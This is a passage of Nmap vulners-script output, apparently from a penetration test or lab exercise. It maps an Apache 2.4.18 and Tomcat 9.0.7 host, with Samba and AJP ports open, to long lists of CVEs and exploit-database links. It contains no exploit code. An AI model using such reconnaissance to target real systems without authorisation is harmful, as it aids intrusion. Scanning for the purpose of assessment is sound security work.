|       MSF:ILITIES/UBUNTU-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/  *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/FREEBSD-CVE-2017-15715/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/  *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/  *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/ *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8 https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8 https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8 https://vulners.com/cve/CVE-2020-35452
|       CVE-2018-1312   6.8 https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8 https://vulners.com/cve/CVE-2017-15715
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8 https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       CVE-2019-10082  6.4 https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4 https://vulners.com/cve/CVE-2017-9788
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/  6.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/   *EXPLOIT*
|       CVE-2019-0217   6.0 https://vulners.com/cve/CVE-2019-0217
|       EDB-ID:47689    5.8 https://vulners.com/exploitdb/EDB-ID:47689  *EXPLOIT*
|       CVE-2020-1927   5.8 https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8 https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577    5.8 https://vulners.com/zdt/1337DAY-ID-33577    *EXPLOIT*
|       CVE-2016-5387   5.1 https://vulners.com/cve/CVE-2016-5387
|       SSV:96537   5.0 https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1333/   5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1303/   5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/   5.0 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/    *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/ 5.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/  5.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/    5.0 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/ *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0 https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED   *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0 https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0 https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355    *EXPLOIT*
|       EDB-ID:40909    5.0 https://vulners.com/exploitdb/EDB-ID:40909  *EXPLOIT*
|       CVE-2021-34798  5.0 https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  5.0 https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-26690  5.0 https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-1934   5.0 https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0 https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.0 https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0 https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0 https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-17189  5.0 https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1333   5.0 https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   5.0 https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0 https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0 https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0 https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-8740   5.0 https://vulners.com/cve/CVE-2016-8740
|       CVE-2016-4979   5.0 https://vulners.com/cve/CVE-2016-4979
|       1337DAY-ID-28573    5.0 https://vulners.com/zdt/1337DAY-ID-28573    *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/   4.9 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/    *EXPLOIT*
|       CVE-2019-0197   4.9 https://vulners.com/cve/CVE-2019-0197
|       MSF:ILITIES/UBUNTU-CVE-2018-1302/   4.3 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1301/   4.3 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/   4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/    *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/  4.3 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/   *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/    4.3 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/ *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/    4.3 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/ *EXPLOIT*
|       EDB-ID:47688    4.3 https://vulners.com/exploitdb/EDB-ID:47688  *EXPLOIT*
|       CVE-2020-11985  4.3 https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3 https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3 https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3 https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  4.3 https://vulners.com/cve/CVE-2018-11763
|       CVE-2016-4975   4.3 https://vulners.com/cve/CVE-2016-4975
|       CVE-2016-1546   4.3 https://vulners.com/cve/CVE-2016-1546
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3 https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-33575    4.3 https://vulners.com/zdt/1337DAY-ID-33575    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/  *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/  3.5 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/   3.5 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/    *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/  *EXPLOIT*
|       CVE-2018-1283   3.5 https://vulners.com/cve/CVE-2018-1283
|       CVE-2016-8612   3.3 https://vulners.com/cve/CVE-2016-8612
|       PACKETSTORM:152441  0.0 https://vulners.com/packetstorm/PACKETSTORM:152441  *EXPLOIT*
|       EDB-ID:46676    0.0 https://vulners.com/exploitdb/EDB-ID:46676  *EXPLOIT*
|       EDB-ID:42745    0.0 https://vulners.com/exploitdb/EDB-ID:42745  *EXPLOIT*
|       1337DAY-ID-663  0.0 https://vulners.com/zdt/1337DAY-ID-663  *EXPLOIT*
|       1337DAY-ID-601  0.0 https://vulners.com/zdt/1337DAY-ID-601  *EXPLOIT*
|       1337DAY-ID-4533 0.0 https://vulners.com/zdt/1337DAY-ID-4533 *EXPLOIT*
|       1337DAY-ID-3109 0.0 https://vulners.com/zdt/1337DAY-ID-3109 *EXPLOIT*
|_      1337DAY-ID-2237 0.0 https://vulners.com/zdt/1337DAY-ID-2237 *EXPLOIT*
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-jsonp-detection: Couldn&amp;#39;t find any JSONP endpoints.
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       syn-ack ttl 61 Apache Jserv (Protocol v1.3)
8080/tcp open  http        syn-ack ttl 61 Apache Tomcat 9.0.7
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 )
|   /manager/html: Apache Tomcat (401 )
|_  /docs/: Potentially interesting folder
|_http-jsonp-detection: Couldn&amp;#39;t find any JSONP endpoints.
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
| vulners: 
|   cpe:/a:apache:tomcat:9.0.7: 
|       B41082A1-4177-53E2-A74C-8ABA13AA3E86    10.0    https://vulners.com/githubexploit/B41082A1-4177-53E2-A74C-8ABA13AA3E86  *EXPLOIT*
|       TOMCAT:5FF617CEB667027ABB70FDFB3A8FFD4C 9.3 https://vulners.com/tomcat/TOMCAT:5FF617CEB667027ABB70FDFB3A8FFD4C
|       SMNTC-107906    9.3 https://vulners.com/symantec/SMNTC-107906
|       PACKETSTORM:153506  9.3 https://vulners.com/packetstorm/PACKETSTORM:153506  *EXPLOIT*
|       MSF:EXPLOIT/WINDOWS/HTTP/TOMCAT_CGI_CMDLINEARGS 9.3 https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/HTTP/TOMCAT_CGI_CMDLINEARGS  *EXPLOIT*
|       EDB-ID:47073    9.3 https://vulners.com/exploitdb/EDB-ID:47073  *EXPLOIT*
|       DB8D8364-06FB-55E8-934E-C013B00821B5    9.3 https://vulners.com/githubexploit/DB8D8364-06FB-55E8-934E-C013B00821B5  *EXPLOIT*
|       3A26C086-A741-585B-8FA9-F90780E2CA16    9.3 https://vulners.com/githubexploit/3A26C086-A741-585B-8FA9-F90780E2CA16  *EXPLOIT*
|       1337DAY-ID-32925    9.3 https://vulners.com/zdt/1337DAY-ID-32925    *EXPLOIT*
|       TOMCAT:BE665F9148D024F7474C0628515C3A37 7.5 https://vulners.com/tomcat/TOMCAT:BE665F9148D024F7474C0628515C3A37
|       MSF:ILITIES/UBUNTU-CVE-2018-8014/   7.5 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-8014/    *EXPLOIT*
|       MSF:ILITIES/ORACLE_LINUX-CVE-2020-1938/ 7.5 https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2020-1938/  *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1938/   7.5 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1938/    *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2020-1938/ 7.5 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2020-1938/  *EXPLOIT*
|       EDB-ID:49039    7.5 https://vulners.com/exploitdb/EDB-ID:49039  *EXPLOIT*
|       CVE-2020-1938   7.5 https://vulners.com/cve/CVE-2020-1938
|       CVE-2018-8014   7.5 https://vulners.com/cve/CVE-2018-8014
|       C3759325-98F9-5F0F-98F5-6EAE787CE3FB    7.5 https://vulners.com/githubexploit/C3759325-98F9-5F0F-98F5-6EAE787CE3FB  *EXPLOIT*
|       7130E91B-2DF2-565E-ADE8-4C60D45E5A4D    7.5 https://vulners.com/githubexploit/7130E91B-2DF2-565E-ADE8-4C60D45E5A4D  *EXPLOIT*
|       6E0425A5-AA6D-5FC6-9F8C-415345C30DD5    7.5 https://vulners.com/githubexploit/6E0425A5-AA6D-5FC6-9F8C-415345C30DD5  *EXPLOIT*
|       1638D72C-F3EB-52FB-B16F-5F1996A67C0A    7.5 https://vulners.com/githubexploit/1638D72C-F3EB-52FB-B16F-5F1996A67C0A  *EXPLOIT*
|       140968B5-6F8E-57C6-8A61-831D5FB78836    7.5 https://vulners.com/githubexploit/140968B5-6F8E-57C6-8A61-831D5FB78836  *EXPLOIT*
|       0B52DD25-4874-54EB-8213-8FA10B0966A3    7.5 https://vulners.com/githubexploit/0B52DD25-4874-54EB-8213-8FA10B0966A3  *EXPLOIT*
|       TOMCAT:3535F2AFC77921EE4AD662129D83A68D 5.8 https://vulners.com/tomcat/TOMCAT:3535F2AFC77921EE4AD662129D83A68D
|       CVE-2021-30640  5.8 https://vulners.com/cve/CVE-2021-30640
|       CVE-2020-1935   5.8 https://vulners.com/cve/CVE-2020-1935
|       TOMCAT:34D1BB5AAB77A4FA5A232BB1CC1DBE12 5.1 https://vulners.com/tomcat/TOMCAT:34D1BB5AAB77A4FA5A232BB1CC1DBE12
|       MSF:ILITIES/ORACLE_LINUX-CVE-2019-17563/    5.1 https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2019-17563/ *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-17563/  5.1 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-17563/   *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-17563/    5.1 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-17563/ *EXPLOIT*
|       CVE-2019-17563  5.1 https://vulners.com/cve/CVE-2019-17563
|       TOMCAT:E0D7CC4566625A34425D5CE3D847746F 5.0 https://vulners.com/tomcat/TOMCAT:E0D7CC4566625A34425D5CE3D847746F
|       TOMCAT:C878975BAAD7823EE793B63FC6053125 5.0 https://vulners.com/tomcat/TOMCAT:C878975BAAD7823EE793B63FC6053125
|       TOMCAT:C3F367059A3E9B8636ED41FF901D93F9 5.0 https://vulners.com/tomcat/TOMCAT:C3F367059A3E9B8636ED41FF901D93F9
|       TOMCAT:A0B0592E070D3A4A393867C40FBB81D8 5.0 https://vulners.com/tomcat/TOMCAT:A0B0592E070D3A4A393867C40FBB81D8
|       TOMCAT:42FCCA1B939943E71978F85565FFC5D2 5.0 https://vulners.com/tomcat/TOMCAT:42FCCA1B939943E71978F85565FFC5D2
|       TOMCAT:3C894B78CB6026265DCB4F6CBB52E528 5.0 https://vulners.com/tomcat/TOMCAT:3C894B78CB6026265DCB4F6CBB52E528
|       TOMCAT:324E50A03961FCE2265C4097A2D9383A 5.0 https://vulners.com/tomcat/TOMCAT:324E50A03961FCE2265C4097A2D9383A
|       TOMCAT:1ACD2AE0B03FBB401CCE27D5C801BE3B 5.0 https://vulners.com/tomcat/TOMCAT:1ACD2AE0B03FBB401CCE27D5C801BE3B
|       TOMCAT:045D264F03959F4DF2D140C7A3C6A05B 5.0 https://vulners.com/tomcat/TOMCAT:045D264F03959F4DF2D140C7A3C6A05B
|       TOMCAT:03526B264C3CCDD4C74F8B8FBF02E5E4 5.0 https://vulners.com/tomcat/TOMCAT:03526B264C3CCDD4C74F8B8FBF02E5E4
|       SSV:99316   5.0 https://vulners.com/seebug/SSV:99316    *EXPLOIT*
|       SMNTC-108874    5.0 https://vulners.com/symantec/SMNTC-108874
|       MSF:ILITIES/UBUNTU-CVE-2018-8034/   5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-8034/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1336/   5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1336/    *EXPLOIT*
|       CVE-2021-42340  5.0 https://vulners.com/cve/CVE-2021-42340
|       CVE-2021-33037  5.0 https://vulners.com/cve/CVE-2021-33037
|       CVE-2021-25122  5.0 https://vulners.com/cve/CVE-2021-25122
|       CVE-2020-17527  5.0 https://vulners.com/cve/CVE-2020-17527
|       CVE-2020-13935  5.0 https://vulners.com/cve/CVE-2020-13935
|       CVE-2020-13934  5.0 https://vulners.com/cve/CVE-2020-13934
|       CVE-2020-11996  5.0 https://vulners.com/cve/CVE-2020-11996
|       CVE-2019-10072  5.0 https://vulners.com/cve/CVE-2019-10072
|       CVE-2019-0199   5.0 https://vulners.com/cve/CVE-2019-0199
|       CVE-2018-8034   5.0 https://vulners.com/cve/CVE-2018-8034
|       CVE-2018-1336   5.0 https://vulners.com/cve/CVE-2018-1336
|       18F5237C-DCAC-5831-AED6-F0880A11DFF2    5.0 https://vulners.com/githubexploit/18F5237C-DCAC-5831-AED6-F0880A11DFF2  *EXPLOIT*
|       TOMCAT:F551C8E09F0122E8322CF8CB981AC710 4.4 https://vulners.com/tomcat/TOMCAT:F551C8E09F0122E8322CF8CB981AC710
|       TOMCAT:A01991EC43D0F6A28E9CB4553C6B4670 4.4 https://vulners.com/tomcat/TOMCAT:A01991EC43D0F6A28E9CB4553C6B4670
|       MSF:ILITIES/SUSE-CVE-2019-12418/    4.4 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-12418/ *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-12418/  4.4 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-12418/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-12418/  4.4 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-12418/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-12418/  4.4 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-12418/   *EXPLOIT*
|       F60737C1-A24B-51C1-AE8D-73A65C778FFF    4.4 https://vulners.com/githubexploit/F60737C1-A24B-51C1-AE8D-73A65C778FFF  *EXPLOIT*
|       E95D9A0E-E9DE-5D95-9879-E07C0257318C    4.4 https://vulners.com/githubexploit/E95D9A0E-E9DE-5D95-9879-E07C0257318C  *EXPLOIT*
|       D5CBA0E2-A4B0-52CE-B93B-F433CE8662DA    4.4 https://vulners.com/githubexploit/D5CBA0E2-A4B0-52CE-B93B-F433CE8662DA  *EXPLOIT*
|       CVE-2021-25329  4.4 https://vulners.com/cve/CVE-2021-25329
|       CVE-2020-9484   4.4 https://vulners.com/cve/CVE-2020-9484
|       CVE-2019-12418  4.4 https://vulners.com/cve/CVE-2019-12418
|       C4EDB405-454C-5160-9A99-21A930740C3F    4.4 https://vulners.com/githubexploit/C4EDB405-454C-5160-9A99-21A930740C3F  *EXPLOIT*
|       B0BA17F5-F171-5C97-9F6C-D5F38B5B64F5    4.4 https://vulners.com/githubexploit/B0BA17F5-F171-5C97-9F6C-D5F38B5B64F5  *EXPLOIT*
|       743F51FB-8BF4-5425-AEFA-10B2A14C8F3B    4.4 https://vulners.com/githubexploit/743F51FB-8BF4-5425-AEFA-10B2A14C8F3B  *EXPLOIT*
|       5602A60A-886A-598C-99B3-EE2E820506AD    4.4 https://vulners.com/githubexploit/5602A60A-886A-598C-99B3-EE2E820506AD  *EXPLOIT*
|       504D019A-423C-50A0-9677-93192F0ECDFC    4.4 https://vulners.com/githubexploit/504D019A-423C-50A0-9677-93192F0ECDFC  *EXPLOIT*
|       4278B435-D22E-57E8-ABC4-639BAAFA6FC9    4.4 https://vulners.com/githubexploit/4278B435-D22E-57E8-ABC4-639BAAFA6FC9  *EXPLOIT*
|       14CD7401-C309-52B2-B4EE-AD54900F0455    4.4 https://vulners.com/githubexploit/14CD7401-C309-52B2-B4EE-AD54900F0455  *EXPLOIT*
|       TOMCAT:6B8125EDA215F510A527D712FEF3FF0A 4.3 https://vulners.com/tomcat/TOMCAT:6B8125EDA215F510A527D712FEF3FF0A
|       TOMCAT:1CE79F1FB24CB690F26B87530FB0DBF3 4.3 https://vulners.com/tomcat/TOMCAT:1CE79F1FB24CB690F26B87530FB0DBF3
|       SMNTC-105524    4.3 https://vulners.com/symantec/SMNTC-105524
|       PACKETSTORM:163457  4.3 https://vulners.com/packetstorm/PACKETSTORM:163457  *EXPLOIT*
|       PACKETSTORM:163456  4.3 https://vulners.com/packetstorm/PACKETSTORM:163456  *EXPLOIT*
|       MSF:ILITIES/JRE-VULN-CVE-2019-2684/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/JRE-VULN-CVE-2019-2684/  *EXPLOIT*
|       MSF:ILITIES/IBM-JAVA-CVE-2019-2684/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/IBM-JAVA-CVE-2019-2684/  *EXPLOIT*
|       MSF:ILITIES/IBM-AIX-CVE-2019-2684/  4.3 https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-2684/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-0221/   4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-0221/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-2684/   4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-2684/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-2684/   4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-2684/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-0221/   4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-0221/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-2684/   4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-2684/    *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-2684/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-2684/  *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-0221/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-0221/  *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2019-2684/   4.3 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-2684/    *EXPLOIT*
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-2684/   4.3 https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-2684/    *EXPLOIT*
|       EDB-ID:50119    4.3 https://vulners.com/exploitdb/EDB-ID:50119  *EXPLOIT*
|       EDB-ID:50118    4.3 https://vulners.com/exploitdb/EDB-ID:50118  *EXPLOIT*
|       CVE-2021-41079  4.3 https://vulners.com/cve/CVE-2021-41079
|       CVE-2021-24122  4.3 https://vulners.com/cve/CVE-2021-24122
|       CVE-2019-0221   4.3 https://vulners.com/cve/CVE-2019-0221
|       CVE-2018-8037   4.3 https://vulners.com/cve/CVE-2018-8037
|       CVE-2018-11784  4.3 https://vulners.com/cve/CVE-2018-11784
|       1337DAY-ID-36546    4.3 https://vulners.com/zdt/1337DAY-ID-36546    *EXPLOIT*
|       1337DAY-ID-36545    4.3 https://vulners.com/zdt/1337DAY-ID-36545    *EXPLOIT*
|       TOMCAT:909935A4BEB7C54CD1FA804D13CDD890 4.0 https://vulners.com/tomcat/TOMCAT:909935A4BEB7C54CD1FA804D13CDD890
|       CVE-2020-13943  4.0 https://vulners.com/cve/CVE-2020-13943
|       SMNTC-111247    0.0 https://vulners.com/symantec/SMNTC-111247
|_      SMNTC-111245    0.0 https://vulners.com/symantec/SMNTC-111245
